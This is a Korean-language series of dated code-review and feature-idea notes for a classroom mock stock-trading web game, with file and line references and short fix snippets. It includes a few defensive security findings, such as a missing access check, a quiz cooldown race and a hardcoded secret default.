# 모의주식게임 일일 분석 노트

---

## 2026-06-23 (2차)

### 추가하면 좋을 기능

- **복권 번호 자동 선택 버튼** (app.js: 복권 참가자 UI, `_lotParticipantPicks` 관련 로직): 학생들이 60초 타이머 내에 1~45에서 숫자 6개를 직접 입력하다 시간 초과하는 경우가 많음. "자동 선택" 버튼 하나를 추가해 `Array.from({length:45},(_,i)=>i+1).sort(()=>Math.random()-0.5).slice(0,6).sort((a,b)=>a-b)` 로 랜덤 번호 6개를 자동 입력하면 해결. 서버 변경 불필요하며, 버튼 하나와 5줄 JavaScript로 구현 가능. 수업 중 복권 라운드 원활한 진행에 직접 기여.

- **시장 탭 가격 상승·하락 플래시 애니메이션** (`app.js:1287-1330`, `filterStocks()`, `renderGrid()`): `renderGrid(filtered, prevPrices)`에서 이미 `prevPrices`를 받아 가격 변동 방향을 알 수 있음. 가격이 오른 카드에 0.5초짜리 초록 배경, 내린 카드에 빨간 배경 CSS 애니메이션 클래스를 일시 적용하면 학생들이 가격 변동을 즉각 인지. CSS `@keyframes flashUp { from {background:rgba(63,185,80,.25)} to {background:transparent} }` + `renderGrid()` 내 `if (prevPrices[st.symbol] && prevPrices[st.symbol] !== st.price) { setTimeout(() => card.classList.add(flashCls), 0); }` 패턴으로 서버 변경 없이 구현. 학생 몰입도 향상 효과가 큼.

- **결과 화면 인쇄 기능** (`app.js:loadResults()`, `static/css/style.css`): 현재 게임 결과를 공유하려면 엑셀 다운로드만 가능하고 직접 인쇄 방법이 없음. 결과 화면(screen-results)에 `<button onclick="window.print()">인쇄하기</button>` 버튼 한 개와 `@media print { .btn, .nav-bar { display:none } #screen-results { display:block !important } }` CSS를 추가하면 엑셀 미설치 환경(Chromebook 등)에서도 수업 결과물 출력 가능. 구현 시간 10분 미만.

- **학생 간 현금 이체(선물하기) 기능** (`app.py` 신규 엔드포인트 `POST /api/rooms/<rid>/transfer`): 경제 수업에서 "거래", "기부", "증여세" 개념을 실습하기 위해 학생 A가 B에게 현금을 이체하는 기능을 추가. `m_from.cash -= amount`, `m_to.cash += amount`, `RoomTransaction(action='TRF', note=f'{sender} → {receiver}')` 두 건 삽입으로 ~30줄 구현. 수혜자 측에도 `toast('친구에게 선물 받음!')`을 다음 폴링 시 띄우려면 `RoomMember`에 `pending_notice` 컬럼을 추가하거나 트랜잭션 조회로 감지하면 됨. 관련 교육 주제(기회비용, 자원 배분)와 연계 가능.

- **복권 참가자 제출 현황 실시간 표시(진행자)** (`app.py:1114-1147`, `app.js: _startLotPolling` 관련): 진행자가 복권 진행 중 누가 번호를 제출했는지 알 방법이 없음. `get_lottery()` 응답에 `all_picks_status: {uid: bool}` (호스트 전용) 필드를 추가하고, 진행자 복권 모달에 참가자별 체크리스트(✅ 제출 / ⏳ 미제출)를 표시하면 "아직 번호 입력 못 한 학생이 있어요"를 즉시 파악 가능. `cur.get('picks', {})` 에서 제출 여부를 알 수 있으므로, `app.py:1141` 호스트 조건 블록에 `'picks_submitted': list(cur.get('picks',{}).keys())` 필드를 추가하는 것만으로 구현 시작 가능.

- **진행자 멤버 목록에서 학생별 섹터 집중도 표시** (`app.py:542-561`, `app.js:408-431`): 현재 진행자 순위 목록은 이름·수익률·총 자산만 표시. `host_members()` 응답에 `top_sector: str` 필드를 추가해 (`RoomHolding` 조회 + 섹터별 현재가 합산) 가장 비중 높은 섹터를 반환하면, 진행자 화면에서 "삼성전자 60% (반도체)"처럼 간략 표시 가능. 수업 중 "이 학생은 왜 반도체 집중 투자를 했을까요?" 교육 개입 포인트를 실시간으로 제공.

---

### 제거/단순화할 것들

- **`host_force_price()` 후 뉴스 캐시 미무효화** (`app.py:673-687`): `host_force_price()`는 내부적으로 `svc.force_price()`를 호출하고, `force_price()`는 `stock_service.py:234-240`에서 `self._news`를 직접 갱신함. 그러나 `app.py:687` 응답 직전에 `_invalidate_news_cache(rid)` 호출이 없어, 뉴스 캐시 TTL(2초) 이내에 폴링하는 참여자는 이전 캐시 뉴스를 받아 강제 가격 변동 연계 뉴스를 놓침. `host_send_news()`(`app.py:700`)에는 동일 무효화 호출이 있으므로, `app.py:686` `return jsonify(...)` 직전에 `_invalidate_news_cache(rid)` 한 줄만 추가하면 일관성 확보.

- **`lobby_members` 엔드포인트에 방 소속 검증 없음** (`app.py:577-585`): `lobby_members()`는 `@login_required`와 `Room.query.get_or_404(rid)`만 수행하고, 요청자가 해당 방의 호스트이거나 멤버인지 확인하지 않음. 로그인된 사용자라면 임의의 `rid`로 다른 방 참가자 목록을 열람할 수 있는 정보 노출 취약점. `if cur_user().id != room.host_id and not RoomMember.query.filter_by(room_id=rid, user_id=cur_user().id).first(): return jsonify({'error':'권한 없음'}), 403` 를 `app.py:581` 직후에 추가하면 방어 가능.

- **`submit_quiz()` 쿨다운 갱신이 비원자적 — 동시 제출 시 이중 보상 가능** (`app.py:1278-1341`): `state = _quiz_state.get(key)` 확인과 `_quiz_state[key] = {... 'cooldown_until': time.time()+60 ...}` 갱신 사이에 잠금이 없음. 같은 학생이 두 개 탭에서 거의 동시에 POST를 보내면 두 요청 모두 `cooldown_until == 0`을 읽고 각각 보상을 지급받을 수 있음. 단순 해결책: `app.py:1281` 상단에서 state를 읽기 전에 `_quiz_state[key] = {'qid': state.get('qid'), 'cooldown_until': time.time()+60, ...}`을 먼저 갱신(선점)한 뒤 정답 여부를 처리하면, 두 번째 요청이 도달할 때는 이미 쿨다운 상태여서 차단됨.

- **`minigame_close()`가 `Room.query.get(rid)` 사용** (`app.py:976`): `minigame_close()` 내 `room = Room.query.get(rid)`는 `Room.query.get_or_404` 대신 구 SQLAlchemy 1.x 스타일의 `.get()`을 그대로 사용 중. 2026-06-14 항목에서 전체 `.get_or_404()` 교체를 권장했으나 이 한 줄은 `.get()` 형태라 빠진 것으로 보임. `db.session.get(Room, rid)` 또는 `Room.query.get_or_404(rid)`로 교체하고, `None` 반환 시 조기 반환(`if not room: return jsonify({'ok': True})`) 처리 추가 권장 (`app.py:976-977`).

- **`export_rankings()` 게임 종료 후에도 `StockService.get_price()` 호출** (`app.py:1430-1439`): `_end_room()` 실행 시 모든 보유 주식을 현재가로 현금 청산하고 `RoomHolding`을 삭제하며 `cleanup_room_service(room.id)`를 호출함 (`app.py:144-154`). 따라서 게임 종료 후 `export_rankings()`에서 `member_total_value(rid, m.user_id)`를 호출하면, 보유 주식이 없으므로 `RoomHolding` 쿼리 결과가 빈 배열이고 `get_price()`도 불필요. `room.status == 'ended'` 조건에서는 `member_total_value()` 대신 `m.cash`를 직접 사용하도록 분기 추가 시 N+1 쿼리 제거와 함께 `StockService`가 없어도 안전하게 동작.

- **`doRouletteSpin()` 예외 발생 시 `_rltSpinning = true` 고착** (`app.js:1032-1097`): `_rltSpinning = true` 설정 이후 `await new Promise(r => setTimeout(r, 4300))` (스핀 애니메이션 대기) 중에 예외가 발생하거나 연결이 끊어지면 `_rltSpinning`이 `true`로 남아 스핀 버튼이 영구 비활성화됨. 현재 `data.error` 경로에서만 `_rltSpinning = false`가 실행됨 (`app.js:1047`). `_rltSpinning = true` 이후 로직 전체를 `try { ... } finally { _rltSpinning = false; }` 로 감싸면 모든 예외 경로에서 상태가 정리됨. 단, 스핀 성공 시에도 `_rltSpinning = false` 는 명시적으로 필요하므로 (`app.js:1096`에 이미 있음) finally 블록과 충돌하지 않음.

---

## 2026-06-23

### 추가하면 좋을 기능

- **방 코드에서 혼동하기 쉬운 문자 제거** (`models.py:8-13`): `gen_code()`가 `string.ascii_uppercase + string.digits` 전체에서 6자리 코드를 생성해 `0`과 `O`, `1`과 `I`/`L`처럼 구분하기 어려운 문자가 포함될 수 있음. 학생들이 프로젝터에서 코드를 보고 손으로 입력할 때 실수하는 주된 원인. `BCDFGHJKLMNPQRSTVWXYZ23456789` 처럼 혼동 가능 문자를 제외한 집합으로 교체하면 입력 오류를 크게 줄일 수 있음 — `models.py:8`의 문자열 한 줄 변경으로 해결 가능.

- **퀴즈 타임아웃을 오답 패널티 없이 처리** (`app.js:876-877`, `app.py:1282-1342`): `submitQuiz(null)` (시간 초과) 시 클라이언트가 `answer: false`를 서버로 보내 오답과 동일한 패널티를 부과함. 시간 초과는 의도적 오답이 아니므로 교육 맥락에서는 패널티 없이 단순 쿨다운만 적용하는 것이 적절. `submit_quiz()` (`app.py:1270`) 호출 시 `timed_out` 파라미터를 추가하거나, 클라이언트에서 `answer: null`을 전송해 서버에서 `if d.get('answer') is None: penalty = 0`으로 분기 처리 권장.

- **`S.assetHistory` 120포인트 상한으로 장기 게임 차트 잘림** (`app.js:752`): 10초 폴링 기준으로 120포인트 = 최근 20분 분량만 유지됨. 60분 이상 게임에서는 자산 변화 차트가 마지막 20분만 표시되어 전체 추세를 볼 수 없음. `S.room.duration_minutes * 6 + 10`(분당 6포인트 기준)처럼 게임 시간에 비례하는 동적 상한값으로 변경하거나, 포트폴리오 탭 진입 시 전체 이력 중 마지막 N개만 렌더링하는 방식 권장 (`app.js:1506-1539` 차트 렌더링 부분 참조).

- **진행자 생성 화면의 "학번" 필드가 교사에게 부적합** (`index.html:51-60`, `app.js:122`): 진행자 생성 화면에 "학번" 필드가 있어 교사도 학번을 입력해야 함. 교사는 학번이 없으므로 혼란스럽고 빈칸 제출 시 유효성 검사 오류가 남. 레이블을 "번호/교번 (선택)"으로 변경하거나 선택 입력으로 바꾸고, 비어 있으면 이름만으로 username을 구성하도록 `doCreateRoom()` 로직을 수정하면 교사 사용 경험이 개선됨.

- **Render 무료 티어 슬립 후 진행 중인 게임의 주가 초기화** (`stock_service.py:318-322`, `app.py:120-163`): Render 무료 티어는 15분 비활성 후 dyno를 재시작함. 재시작 시 `get_room_service(rid)`가 새 `StockService` 인스턴스를 생성해 `_init_prices()`가 다시 실행되므로 모든 종목 가격이 새 무작위값으로 초기화됨. 게임 도중 교사 탭이 15분 이상 백그라운드에 있다가 돌아오면 주가가 완전히 달라져 있을 수 있음. 단기 해결책으로 `GET /api/ping` 같은 헬스체크 엔드포인트를 추가하고 외부 cron(예: UptimeRobot)으로 10~14분마다 핑하면 슬립을 방지할 수 있음. 중장기적으로는 가격 상태를 DB에 영속화하는 것이 근본 해결책.

---

### 제거/단순화할 것들

- **`RoomMember.cash` 등 금액 컬럼이 `Float` 타입** (`models.py:52`, `models.py:62`, `models.py:77`, `models.py:88`): `RoomMember.cash`, `RoomHolding.avg_price`, `RoomTransaction.price/amount`, `Deposit.amount` 모두 `db.Column(db.Float)`으로 선언되어 있음. 부동소수점 정밀도 문제로 이자 계산·포트폴리오 집계 등에서 오차가 누적될 수 있음. SQLite 환경에서는 당장 체감하기 어렵지만 PostgreSQL 이전 시 두드러짐. `db.Numeric(precision=18, scale=2)` 또는 정수(원 단위)로 변경하고 `round()` 호출에 의존하지 않는 것이 장기적으로 안전.

- **`_room_cache` TTL 1.5초가 폴링 주기 10초보다 훨씬 짧아 캐시 히트 불가** (`app.py:45`): `ROOM_CACHE_TTL = 1.5`초인데 클라이언트 폴링 주기는 10초. 캐시 생성 후 1.5초면 만료되므로 다음 폴링(약 8.5초 후)이 도착할 때는 항상 캐시 미스 상태. 동시에 여러 참여자가 폴링하는 짧은 창에서만 캐시 효과가 있음. TTL을 폴링 주기보다 약간 짧게(예: 8초)로 늘리면 같은 10초 사이클 내 여러 참여자의 중복 DB 조회를 방지하는 효과가 훨씬 커짐.

- **`openpyxl` import가 라우트 함수 내부에 선언됨** (`app.py:1422-1424`): `import openpyxl`과 `from openpyxl.styles import ...`가 `export_rankings()` 함수 안에 있음. 파이썬이 모듈을 캐싱하므로 큰 문제는 아니지만, `openpyxl` 미설치 오류가 서버 시작 시 즉시 드러나지 않고 첫 엑셀 다운로드 요청(수업 종료 직후)까지 숨겨짐. 모듈 최상단(`from flask import ...` 근처)으로 이동하면 패키지 누락이 배포 시작 즉시 감지됨.

- **`_prev` 가격이 게임 시작 이후 갱신되지 않아 `change_pct`가 누적 변동률이 됨** (`stock_service.py:127`): `self._prev[sym] = start`로 초기화 후 `get_price()`가 가격을 업데이트해도 `_prev`는 변하지 않음. `get_prev_close()`가 항상 게임 시작 가격을 반환하므로 `change_pct`는 "직전 대비"가 아닌 "게임 시작 이후 누적 변동률"을 표시함. 30분 게임 후반에는 변동률이 ±30% 이상이 되어 실제 주식 화면과 달리 느껴짐. `get_price()` 내 `self._prices[symbol] = (now, new_price)` 직전에 `self._prev[symbol] = price`를 추가하면(`stock_service.py:185` 근처) 실제 "직전 TTL 대비" 변동률 표시가 가능해짐.

- **참여자 폴링에서 `refreshMyRank()`와 순위 탭 `loadParticipantRankings()`가 rankings API를 중복 호출** (`app.js:647-649`): 10초 폴링 루프 마지막 두 줄이 각각 `refreshMyRank()`(rankings API 호출)와 `if (S.currentPage === 'rankings') loadParticipantRankings()`(또 rankings API)를 실행함. 순위 탭이 열려 있을 때 매 10초마다 동일한 `GET /api/rooms/<rid>/rankings`가 2번 발생. `loadParticipantRankings()` 완료 후 그 응답에서 `data.find(e => e.is_me)`로 헤더 통계를 갱신하도록 통합하거나, 순위 탭이 활성화된 경우 `refreshMyRank()` 별도 호출을 생략하면 API 요청 1건 절약.

---

## 2026-06-10

### 추가하면 좋을 기능

- **게임 일시정지 버튼** (`app.py:176-188`, `index.html:161-163`): 수업 중 갑작스러운 상황(화재 대피, 기술 오류 등)에 대비해 진행자가 타이머를 멈추고 거래를 차단할 수 있는 pause/resume API와 버튼이 필요함. 현재는 시작 후 종료 외에 선택지가 없음.

- **"전량 매수/매도" 버튼** (`index.html:401-415`, `app.js:699-727`): 주식 모달에 "최대 수량" 또는 "전량 매도" 버튼 추가. 학생들이 잔액으로 살 수 있는 최대 주수를 자동 계산해 주면 수업 몰입도 향상. `Math.floor(port.cash / S.tradePrice)` 로 계산 가능.

- **거래 후 모달 내 보유 수량 갱신** (`app.js:714-727`): `execTrade()` 성공 후 `ms-holding` 요소가 업데이트되지 않아 사용자가 매수/매도 직후 모달에서 잘못된 보유 수량을 봄. `openStockModal`을 재호출하거나 보유 수량만 따로 갱신하는 로직 추가 필요.

- **참여자 순위 페이지 자동 새로고침** (`app.js:546-550`): 순위 탭(`pg-rankings`)은 진입 시 한 번만 로드됨. `showPage('rankings')` 호출 시 setInterval로 주기적 갱신하거나, 글로벌 poll loop(`app.js:422-434`)에 rankings 탭 활성 시 `loadParticipantRankings()` 호출 추가.

- **게임 시작 확인 대화상자** (`app.js:191-199`): 종료 버튼(`doEndGame`)에는 `confirm()`이 있지만 시작 버튼에는 없음. 실수로 눌러 학생들이 준비 전에 게임이 시작될 수 있으므로 `doStartGame()`에도 확인 단계 추가.

- **방 코드 충돌 재시도 처리** (`models.py:8-9`, `models.py:25`): `gen_code()`가 중복 코드를 생성할 경우 SQLAlchemy가 `IntegrityError`를 발생시키고 500 오류가 반환됨. `create_room` 라우트에서 루프로 재시도하는 로직 추가 권장.

- **진행자 로비에서 참여자 강퇴 기능** (`index.html:97-108`): 로비에서 잘못 입장한 학생을 진행자가 제거할 수 없음. `DELETE /api/rooms/<rid>/members/<uid>` 엔드포인트와 버튼 추가 고려.

- **종목 가격 차트 히스토리 캐싱** (`stock_service.py:168-189`): `get_history()`는 매 요청마다 새로운 무작위 OHLC 데이터를 생성함. 학생이 모달을 열었다 닫으면 차트가 완전히 바뀌어 혼란 유발. 세션(또는 방) 단위로 히스토리를 한 번 생성해 캐싱하면 일관된 차트 제공 가능.

- **거래 내역 타임스탬프 KST 표기** (`app.py:435`): `t.timestamp.strftime('%m-%d %H:%M')`은 UTC 기준이라 한국 학생들이 보는 시간이 실제보다 9시간 뒤처짐. `+ timedelta(hours=9)` 또는 `pytz`/`zoneinfo`로 KST 변환 후 출력 필요.

---

### 제거/단순화할 것들

- **app.js의 포모도로 잔여 코드 (~200줄)** (`app.js:1109-1359`): 포모도로 기능이 `/pomodoro` 독립 페이지로 이전된 후 `_PT_REMOVED` 객체와 `ptGetAudio`, `ptBeep`, `ptPlayDone`, `ptFormatTime`, `ptFormatTotal`, `ptUpdateUI`, `ptSwitchMode`, `ptHandleComplete`, `ptToggle`, `ptReset`, `ptCustomChange`, `ptInitTicks` 함수들이 app.js에 그대로 남아 있음. 약 200줄의 데드 코드 — 전부 삭제 가능.

- **`refreshTotalAsset()` 중복 API 호출** (`app.js:709-727`): `execTrade()` 성공 시 `refreshTotalAsset()`(portfolio API)과 `refreshMyRank()`(rankings API)를 둘 다 호출함. rankings 응답에 이미 `total_value`가 포함되어 있으므로 portfolio API 호출을 제거하고 rankings 결과로 헤더 자산 표시를 갱신하면 요청 1건 절약.

- **진행자 바 차트 매번 재생성** (`app.js:300-337`): `renderHostBarChart()`는 10초마다 `S.hostBarChart.destroy()` 후 새 Chart 객체를 만들어 깜빡임과 불필요한 DOM 조작 발생. Chart.js의 `chart.data.datasets[0].data = values; chart.update()` 패턴으로 교체하면 부드럽게 갱신 가능.

- **글로벌 주식 서비스 싱글톤** (`stock_service.py:192`): `stock_service`가 서버 전체에서 공유되어 동시에 여러 교사가 게임을 운영할 경우 모든 방이 동일한 주가와 뉴스를 공유함. 지금은 단일 교실용이지만 확장성을 위해 향후 방 ID별 독립 인스턴스 또는 가격 시드를 방 단위로 관리하는 방안 고려.

- **`app.py:606`의 `debug=True`** (`app.py:606`): `if __name__ == '__main__'` 블록에 `debug=True`가 하드코딩되어 있음. 개발 중에는 무관하지만 환경 변수로 분리하거나(`debug=os.environ.get('FLASK_DEBUG','0')=='1'`) 제거하는 것이 안전.

- **`cur_user()` deprecated Query.get 패턴** (`app.py:30`): `User.query.get(session['user_id'])`는 SQLAlchemy 2.0에서 폐기됨. 전체 코드에서 `.query.get(id)` 패턴을 `db.session.get(Model, id)`로 일괄 교체 권장 (`app.py:30`, `app.py:65`, `app.py:125`, `app.py:209`, `app.py:249` 등 다수).

- **교육 콘텐츠 정적 하드코딩** (`education_data.py`): 용어사전·가이드·팁이 파이썬 파일에 하드코딩되어 있어 내용 수정 시 재배포 필요. 단기적으로는 JSON 파일로 분리해 재시작 없이 수정 가능하게 하는 것만으로도 유지보수성이 크게 향상됨.

---

## 2026-06-11

### 추가하면 좋을 기능

- **뉴스 히스토리 피드** (`app.js:507-526`, `app.py:323-327`): 폭탄뉴스 팝업은 3초 후 자동으로 사라지고(`app.js:644`) 재확인 방법이 없음. 서버에서 최근 뉴스 5~10개를 리스트로 반환하는 `GET /api/rooms/<rid>/news/history` 엔드포인트를 추가하고, 시장 탭 상단에 접을 수 있는 뉴스 피드를 두면 늦게 본 학생도 정보를 놓치지 않음.

- **진행자 "시간 연장" 버튼** (`app.py:177-189`, `index.html:170-173`): 게임 시작 후 조기 종료만 가능하고 시간 연장은 불가. 수업 시간이 늘어나거나 마무리 토론이 필요할 때 진행자가 `N분 연장`할 수 있는 `POST /api/rooms/<rid>/extend` 엔드포인트와 버튼 추가 시 현장 유연성 대폭 향상.

- **퀴즈 제출 게임 종료 후 차단** (`app.py:579-609`): `submit_quiz()`가 `room.status == 'active'` 여부를 확인하지 않음. 게임이 끝난 직후 퀴즈 창이 열려 있던 학생이 제출하면 `ended` 상태인 방의 `RoomMember.cash`가 여전히 변경됨. `app.py:581` 직후에 `if room.status != 'active': return jsonify({'error': '게임이 종료되었습니다'}), 400` 체크 추가 필요.

- **인게임 가격 이력 기록 및 차트 연동** (`stock_service.py:201-222`): `get_history()`는 현재 가격에서 역으로 무작위 OHLC 데이터를 생성해 모달을 열 때마다 완전히 다른 차트가 표시됨. 실제 게임 중 가격 변경 이벤트를 `_price_log: list[tuple[float, float]]` 형태로 `StockService`에 축적하고 이를 차트 데이터로 활용하면 학생들이 의미 있는 추세를 분석할 수 있음 (`stock_service.py:134-147` 가격 갱신 시 로그 추가).

- **엑셀 내보내기에 종목별 거래내역 시트 추가** (`app.py:631-701`): 현재 엑셀에는 최종 순위 시트 하나만 있음. `RoomTransaction` 테이블을 활용해 학생별 거래 내역을 두 번째 시트로 추가하면 교사가 어떤 전략을 썼는지 사후 분석 가능 (`app.py:681` `wb.create_sheet('거래내역')`으로 확장).

- **게임 참여 후 늦은 입장 알림** (`app.py:156-167`, `app.js:120-143`): `join_room()`은 `active` 상태 방에도 조용히 입장시켜 학생이 게임 도중에 참가했다는 사실을 인지하지 못함. 응답에 `late_join: true` 플래그를 추가하고 프론트에서 "게임이 이미 진행 중입니다. N분 경과" 경고를 표시하면 혼란 방지.

- **진행자 퀴즈 통계 패널** (`app.py:560-609`): 진행자 화면에서 어떤 학생이 퀴즈를 풀었는지, 정답률이 얼마인지 볼 수 없음. `_quiz_state` 딕셔너리를 확장해 정답/오답 횟수를 기록하고 진행자 대시보드에 퀴즈 통계 카드를 추가하면 수업 참여도 파악에 도움.

---

### 제거/단순화할 것들

- **`member_total_value()` N+1 쿼리** (`app.py:33-43`, `app.py:427-443`): 순위 조회 시 참여자 수만큼 루프를 돌며 `RoomHolding`·`Deposit` 쿼리를 반복 실행. 학생 30명 기준 최소 60회 추가 쿼리 발생. `RoomHolding.query.filter_by(room_id=rid).all()`로 보유 종목을 한 번에 가져온 뒤 딕셔너리로 그룹화하면 O(N) → O(1) 쿼리로 단순화 가능.

- **`SECRET_KEY` 하드코딩 기본값** (`app.py:12`): `'mock-stock-game-secret-2024'`가 기본값으로 노출되어 있어 환경변수를 설정하지 않으면 누구나 세션 쿠키를 위조할 수 있음. `os.environ.get('SECRET_KEY')` 만 남기고 값이 없으면 `RuntimeError`로 서버 시작을 막는 방식으로 변경 권장.

- **`_quiz_state`·`_quiz_settings` 인메모리 딕셔너리** (`app.py:560-561`): Render 무료 티어는 15분 비활성 시 dyno를 재시작함. 게임 도중 재시작되면 모든 쿨다운과 퀴즈 설정이 초기화되어 학생들이 쿨다운 없이 반복 퀴즈를 풀 수 있음. `Room` 모델에 `quiz_reward_pct`·`quiz_penalty_pct` 컬럼을 추가하고, 쿨다운은 `RoomMember`에 `quiz_cooldown_until` 컬럼으로 DB에 저장하면 재시작 후에도 상태 유지.

- **`force_price()` 후 `_current_biases` 미갱신** (`stock_service.py:175-196`): 진행자가 특정 종목을 강제로 올리거나 내린 직후 다음 주기에 `_current_biases`에 반영되지 않아 가격이 원래 방향으로 되돌아갈 수 있음. `force_price()` 내부에서 `self._current_biases[symbol] = direction`를 추가(`stock_service.py:193` 부근)하면 강제 조정의 모멘텀이 다음 사이클에도 유지됨.

- **진행자 바차트 매 10초 전체 재생성** (`app.js:328-365`): `renderHostBarChart()`가 매번 기존 차트를 `destroy()`하고 새로 생성해 깜빡임 발생 (어제 분석과 연계). 추가로, `loadHostMembers()` 자체가 진행자 탭에 관계없이 10초마다 호출되므로 `htab-rank` 탭이 비활성 상태일 때는 DOM 조작 없이 데이터만 가져오도록 `if (S.hostTab !== 'rank') return;` 가드를 `renderHostBarChart` 시작부에 추가 권장 (`app.js:328`).

---

## 2026-06-12

### 추가하면 좋을 기능

- **참여자 로비 멤버 목록 실질적 버그 수정** (`app.py:223-233`, `app.js:420-428`): `GET /api/rooms/<rid>/host/lobby-members`는 `room.host_id != user.id` 조건으로 참여자에게 403을 반환함. 하지만 `loadPLobbyMembers()`(app.js:420)는 이 엔드포인트를 그대로 호출 — `if (!Array.isArray(data)) return` 가드가 에러 응답을 조용히 무시해 참여자 대기 화면의 "대기 중인 참여자" 목록이 항상 비어 있음. 호스트 체크 없이 멤버 목록만 반환하는 `GET /api/rooms/<rid>/members` 엔드포인트를 별도 추가하거나, `lobby_members`에서 호스트 전용 체크를 제거하는 것으로 수정 가능.

- **게임 종료 후 개인 포트폴리오 상세 확인 불가** (`index.html:424-444`, `app.js:1126-1170`): 결과 화면(`screen-results`)은 최종 순위·총 자산·수익률만 표시하고 보유 종목별 손익이나 거래 내역은 볼 수 없음. 수업 후 토론을 위해 게임이 끝나도 `GET /api/rooms/<rid>/portfolio`와 `GET /api/rooms/<rid>/transactions` 응답을 결과 화면에 "내 거래 내역 펼치기" 섹션으로 추가하면 학습 효과 대폭 향상.

- **매수/매도 버튼 중복 클릭 방지** (`app.js:863-876`): `execTrade()`가 API 호출 중 버튼을 비활성화하지 않아, 학생이 빠르게 두 번 클릭하면 동일 주문이 두 번 실행될 수 있음. 호출 시작 시 매수/매도 버튼을 `disabled = true`로 설정하고, 응답 수신 후 다시 `disabled = false`로 되돌리는 것만으로 충분.

- **종료된 방 목록 조회 엔드포인트** (`app.py:80-86`): `find_active_room()`은 `waiting`·`active` 상태만 찾음. 게임이 끝난 후 홈으로 돌아가면 해당 방 결과를 다시 볼 방법이 없음. `GET /api/rooms/my-rooms` (또는 `?status=ended`) 엔드포인트를 추가하고 결과 화면에 "이전 게임 보기" 링크를 두면 교사가 수업 후 결과를 재확인할 수 있음.

- **자산 변화 차트가 포트폴리오 탭 진입 시에만 그려짐** (`app.js:929-964`, `index.html:302-306`): `asset-line-chart`는 `loadPortfolio()` 내부에서만 렌더링됨. 학생이 포트폴리오 탭을 한 번도 열지 않으면 `S.assetHistory`에 데이터가 쌓여도 차트가 보이지 않음. `refreshMyRank()`에서 이미 `S.assetHistory`를 누적하므로(`app.js:480-482`), 포트폴리오 탭 진입 시 또는 일정 포인트 이상 쌓이면 자동으로 차트가 갱신되도록 하면 학생이 자신의 수익 추이를 놓치지 않음.

- **진행자 전체 학생 일괄 현금 지급** (`app.py:235-251`, `index.html:500-520`): 현재 `host_adjust`는 단일 참여자에게만 조정 가능. 이벤트 보상·벌금을 전체 학생에게 동시에 적용하려면 매번 30명을 개별 조정해야 함. `user_id` 대신 `'all'` 값을 허용하거나 별도 `POST /api/rooms/<rid>/host/adjust-all` 엔드포인트를 추가하면 현장 편의성 대폭 향상.

- **알 수 없는 사용자 공유 계정 위험** (`app.py:108-115`): `User.query.filter_by(username=u).first()`는 학번+이름 조합이 동일한 모든 입력을 같은 계정으로 처리함. 같은 반에 동명이인이 있거나 학번 없이 이름만 입력한 경우 두 학생이 동일 계정·동일 포트폴리오를 공유하게 됨. 단기 해결책으로 room-join 시 이미 해당 username이 다른 활성 세션에서 접속 중이면 경고 메시지를 표시하도록 처리 가능.

---

### 제거/단순화할 것들

- **`/host/lobby-members` "host" 접두사 오해 유발** (`app.py:223`): URL 경로가 `/host/lobby-members`이지만 참여자 화면에서도 이 엔드포인트를 직접 호출함 (`app.js:421`). 위 버그 수정과 함께 `/api/rooms/<rid>/members`(or `lobby-members`)로 경로를 이동하고 `@login_required`만 유지하면 역할 구분이 명확해짐.

- **`refreshMyRank()` 전체 순위 배열 → 개인 통계 전용 호출로 대체** (`app.js:465-483`): 참여자 게임 화면에서 5초마다 `GET /api/rooms/<rid>/rankings`를 호출해 전체 배열을 내려받은 뒤 `data.find(e => e.is_me)`로 자신의 항목 하나만 사용함. 참여자 30명이면 분당 360회의 전체 순위 직렬화 발생. `GET /api/rooms/<rid>/my-stats`처럼 현재 사용자의 `{rank, total_value, gain_pct}`만 반환하는 경량 엔드포인트로 교체하면 서버 부하와 응답 크기를 모두 줄일 수 있음.

- **`stock_service.py:207` 기간 키 불일치** (`stock_service.py:207`, `app.py:335`): `get_history()` 내부 `n_bars` 딕셔너리는 `'5d': 5` 키를 사용하지만, `app.py:335`의 period 매핑은 UI 파라미터 `'1w'`를 yfinance `period='5d'`로 변환해 전달함. `n_bars`에서 `'5d'`가 매칭되어 5개 봉이 생성되는 건 우연히 맞아떨어지는 것이며, `'1d'` 키도 하루치 30봉을 의미하는지 30일치를 의미하는지 불명확. 키를 실제 UI 파라미터(`'1d'`, `'1w'`, `'1mo'`, `'3mo'`, `'1y'`)로 통일하고 `n_bars` 값을 명확히 재정의하면 혼란 방지.

- **`enterParticipantGame()`의 PAGE_ORDER 초기화 루프** (`app.js:437-445`): 게임 진입 시 `PAGE_ORDER.forEach`로 모든 페이지를 순회하며 `hidden` 속성을 개별 토글함. `screen-p-game`이 처음 로드될 때는 `market` 외 모든 페이지가 이미 `hidden`이므로 이 루프는 실질적으로 시장 탭만 보이게 하는 작업. `document.querySelectorAll('#screen-p-game .page').forEach(el => el.setAttribute('hidden',''))` 후 `document.getElementById('pg-market').removeAttribute('hidden')` 두 줄로 단순화 가능.

- **`get_room()` 자동 종료 체크가 일부 엔드포인트에서 누락** (`app.py:169-175`, `app.py:427-443`): `get_room()` 라우트는 `end_time` 초과 시 자동으로 `_end_room()`을 호출하지만, `get_rankings()`·`get_portfolio()` 등 다른 엔드포인트는 만료 체크 없이 `active` 상태를 반환함. 선생님이 탭을 닫아도 학생 폴링이 계속되면 종료 시각이 지난 뒤에도 `remaining_seconds`가 0으로 보이지 않아 타이머가 계속 카운트됨. 자동 종료 체크를 `before_request` 훅이나 공통 `get_active_room()` 헬퍼로 통합하면 일관성 보장.

---

## 2026-06-13

### 추가하면 좋을 기능

- **진행자 전체화면 순위판(프로젝터 모드)** (`app.py:427-443`, `index.html:128-131`): 교실에서 교사가 빔 프로젝터로 화면을 띄울 때 진행자 대시보드는 모바일 레이아웃이라 읽기 어려움. `/api/rooms/<rid>/rankings`를 주기적으로 폴링해 순위·수익률·타이머를 큰 글씨로 표시하는 `/projector?room=<rid>` 전용 페이지를 추가하면 수업 몰입도 향상. 별도 인증 없이 방 코드 URL만으로 접근 가능하게 하고 자동 새로고침(5초)만 구현해도 즉시 활용 가능.

- **`host_adjust` delta 입력값 범위 검증 없음** (`app.py:243-244`): `delta = float(d.get('delta', 0))`에 최소/최대 검증이 전혀 없음. 교사가 `500000000`(5억)을 `5000000`(500만) 대신 실수로 입력하면 학생의 자산이 비정상적으로 커짐. `if abs(delta) > room.starting_cash * 10: return jsonify({'error': ...}), 400` 정도의 상한선을 추가하거나, 프론트엔드 `adj-delta` 입력에 `max`/`min` 속성을 `room.starting_cash` 기준으로 설정하면 실수 방지 가능 (`index.html:511`, `app.js:382`).

